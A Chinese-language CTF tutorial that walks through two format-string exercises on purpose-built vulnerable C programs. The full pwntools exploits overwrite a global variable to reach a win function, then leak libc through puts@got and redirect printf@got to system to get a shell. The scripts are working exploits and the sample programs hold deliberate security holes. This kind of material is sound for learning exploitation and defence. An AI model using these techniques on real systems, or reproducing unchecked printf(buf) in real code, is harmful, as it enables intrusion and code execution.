---
title: "02.1 格式化字符串经典例题"
description: "通过两道实测例题演示格式化字符串的偏移定位、大小序分段写入，以及泄露 libc 并改写 GOT 表获取 Shell 的完整流程。"
categories: [Pwn笔记, 第02章 格式化字符串]
tags: [format-string, got-hijack, pwntools]
---

本文结合两道经典题型，串起前一篇的偏移定位、大小序分段写、`%k$s` 任意读和 `fmtstr_payload` 改写 GOT 表。两道题均在 Ubuntu x86-64 下实测编译打通。

## 例题一：改写全局变量触发后门

### 题目源码与保护

```c
#include <stdio.h>
#include <unistd.h>

int magic = 0;

void win(void)
{
    puts("flag{fmt_str_write_success}");
}

void vuln(void)
{
    char buf[128];
    ssize_t n = read(0, buf, sizeof(buf) - 1);
    if (n <= 0)
    {
        return;
    }
    buf[n] = '\0';
    printf(buf);
    if (magic == 0x1337beef)
    {
        win();
    }
    else
    {
        printf("\nmagic = 0x%x\n", magic);
    }
}

int main(void)
{
    setvbuf(stdout, NULL, _IONBF, 0);
    vuln();
    return 0;
}
```

编译为关闭 PIE 的 64 位程序：

```bash
gcc -no-pie -fno-stack-protector -Wno-format-security chal1.c -o chal1
```

反编译伪代码：

```c
int vuln()
{
  ssize_t v0; // rax
  char buf[136]; // [rsp+0h] [rbp-90h] BYREF
  ssize_t v3; // [rsp+88h] [rbp-8h]

  v0 = read(fd: 0, buf, nbytes: 0x7Fu);
  v3 = v0;
  if ( v0 > 0 )
  {
    buf[v3] = 0;
    printf(format: buf);
    if ( magic == 322420463 )
      LODWORD(v0) = win();
    else
      LODWORD(v0) = printf(format: "\nmagic = 0x%x\n", magic);
  }
  return v0;
}
```

目标 `magic` 位于 `0x40403c`，要求改写为 `0x1337beef`（`322420463`），程序只有一次 `printf(buf)` 触发机会。

### 分析与偏移计算

1. **确定起始偏移 `k`**：伪代码中 `buf` 的栈偏移为 `[rsp+0h]`，离栈顶距离为 0，直接算出 `k = 6 + 0 / 8 = 6`。输入 `AAAAAAAA.%p.%p.%p.%p.%p.%p.%p.%p` 实测验证：

```text
AAAAAAAA.0x7ffc37187de0.0x7ffc37187de0.(nil).(nil).0x700698157380.0x4141414141414141.0x252e70252e70252e.0x2e70252e70252e70
```

第 6 项输出 `0x4141414141414141`，与 `k = 6` 一致。

2. **按数值从小到大拆段**：`0x1337beef` 的低 2 字节（`0xbeef = 48879`）大于高 2 字节（`0x1337 = 4919`）。由于 `printf` 内部输出计数器只能递增，先写数值较小的高 2 字节，再补差值写低 2 字节：

- 第 1 段写高 2 字节（`magic + 2 = 0x40403e`）：用 `%4919c` 把累计输出推到 `4919`，再用 `%hn` 写入 `0x1337`；
- 第 2 段写低 2 字节（`magic = 0x40403c`）：差值 `48879 - 4919 = 43960`，用 `%43960c` 把计数推到 `48879`，再用 `%hn` 写入 `0xbeef`。

3. **对齐与槽位分配**：控制前缀 `%4919c%10$hn%43960c%11$hn` 长 25 字节，向 8 字节边界补 7 个 `'A'` 凑满 32 字节（占掉 `%6$`~`%9$` 共 `m = 4` 个槽位），末尾接的两个地址正好落在 `%10$` 和 `%11$`：

```text
buf[0..31]  (%6$ ~ %9$): "%4919c%10$hn%43960c%11$hnAAAAAAA"  (25 + 7 = 32 字节)
buf[32..39] (%10$):      p64(0x40403e)
buf[40..47] (%11$):      p64(0x40403c)
```

### 完整 exp

```python
from pwn import *
elf=ELF("./chal1")
context.binary=elf
io=process("./chal1")
magic=elf.sym["magic"]
payload=b"%4919c%10$hn%43960c%11$hn".ljust(32,b"A")+p64(magic+2)+p64(magic)
io.send(payload)
print(io.recvall().decode(errors="ignore"))
```

运行后程序输出大量空格并触发 `win()`，打印出 `flag{fmt_str_write_success}`。

---

## 例题二：泄露 libc 并改写 GOT 表拿 Shell

### 题目源码与保护

```c
#include <stdio.h>
#include <unistd.h>

void vuln(void)
{
    char buf[128];
    while (1)
    {
        ssize_t n = read(0, buf, sizeof(buf) - 1);
        if (n <= 0)
        {
            break;
        }
        buf[n] = '\0';
        printf(buf);
    }
}

int main(void)
{
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
    puts("Welcome:");
    vuln();
    return 0;
}
```

编译为 Partial RELRO、关闭 PIE 的 64 位程序：

```bash
gcc -no-pie -Wl,-z,relro -Wno-format-security chal2.c -o chal2
```

反编译伪代码：

```c
unsigned __int64 vuln()
{
  ssize_t v1; // [rsp+8h] [rbp-98h]
  char buf[136]; // [rsp+10h] [rbp-90h] BYREF
  unsigned __int64 v3; // [rsp+98h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  while ( 1 )
  {
    v1 = read(fd: 0, buf, nbytes: 0x7Fu);
    if ( v1 <= 0 )
      break;
    buf[v1] = 0;
    printf(format: buf);
  }
  return v3 - __readfsqword(0x28u);
}
```

程序开启 Partial RELRO、关闭 PIE，GOT 表可写；`vuln()` 为无限循环且每次最多读入 127 字节。

### 分析与利用步骤

1. **确定偏移 `k`**：伪代码中 `buf` 位于 `[rsp+10h]`（前面 `0x10` 字节被局部变量 `v1` 与栈对齐占用），因此 `k = 6 + 0x10 / 8 = 8`。发 `AAAAAAAA.%p.%p.%p.%p.%p.%p.%p.%p` 实测验证：

```text
AAAAAAAA.0x7ffdea214910.0x7ffdea214910.(nil).0x8.0x7924a6156380.0xa.0x21.0x4141414141414141
```

`0x4141414141414141` 落在第 8 位，确认 `k = 8`。

2. **第 1 轮：泄露 `puts@got` 计算基址**：`main()` 开头调用过 `puts("Welcome:")`，`puts@got` 已经完成延迟绑定。构造 `"%9$sEND_"`（刚好占满 8 字节的 `%8$` 槽位）后接 `p64(puts_got)`（落入 `%9$`）；追加 `END_` 作为定界标记，用来截断末尾地址中自带的可见字符干扰，取出 6 字节真实地址后即可算出 `libc_base` 和 `system`。

3. **第 2 轮：改写 `printf@got` 为 `system`**：使用 `fmtstr_payload(8, {printf_got: system}, write_size="short")`。这里若用默认的 `write_size="byte"`，写一个 64 位地址最多会拆出 6\~8 条 `%hhn` 并附带等量地址，很容易超出 127 字节的 `read` 上限；改用 `"short"` 按 2 字节拆成 3 段后，总长度可以稳稳控制在限制内。

4. **第 3 轮：清理缓冲并触发 Shell**：第 2 轮写入过程会打印大量空格填充，发送前需先等输出落盘并调用 `io.clean()` 清空接收区，再发送 `"/bin/sh\x00"`，下一次执行 `printf(buf)` 即跳转为 `system("/bin/sh")`。

### 完整 exp

```python
from pwn import *
elf=ELF("./chal2")
context.binary=elf
libc=elf.libc
io=process("./chal2")
puts_got=elf.got["puts"]
printf_got=elf.got["printf"]
io.recvuntil(b"Welcome:\n")
io.sendline(b"AAAAAAAA.%p.%p.%p.%p.%p.%p.%p.%p")
k=io.recvline().decode().split(".").index("0x4141414141414141")
leak_payload=f"%{k+1}$sEND_".ljust(8,"A").encode()+p64(puts_got)
io.send(leak_payload)
leak=u64(io.recvuntil(b"END_",drop=True).ljust(8,b"\x00"))
libc_base=leak-libc.sym["puts"]
system=libc_base+libc.sym["system"]
payload=fmtstr_payload(k,{printf_got:system},write_size="short")
io.send(payload)
sleep(0.2)
io.clean()
io.send(b"/bin/sh\x00")
io.interactive()
```

---

## 常见踩坑小结

- **不要硬编码 `k`**：同一套代码多一个局部变量或换一种编译选项，`k` 就可能从 `6` 变成 `8`；写进 exp 里动态 `index("0x4141414141414141")` 探测最稳妥。
- **留意缓冲区长度上限**：`fmtstr_payload` 默认按 1 字节（`'byte'`）拆分，遇到 `buf` 只有 64\~128 字节的题目容易被截断，换成 `write_size="short"` 通常能压进限制内。
- **改写后等待缓冲清空再发下一轮**：第 2 轮写入 `printf@got` 会打印大量填充空格，先 `sleep` 配合 `io.clean()` 清掉多余输出再发 `"/bin/sh\x00"`，能避免下一轮 `read` 和输入流粘连错位。
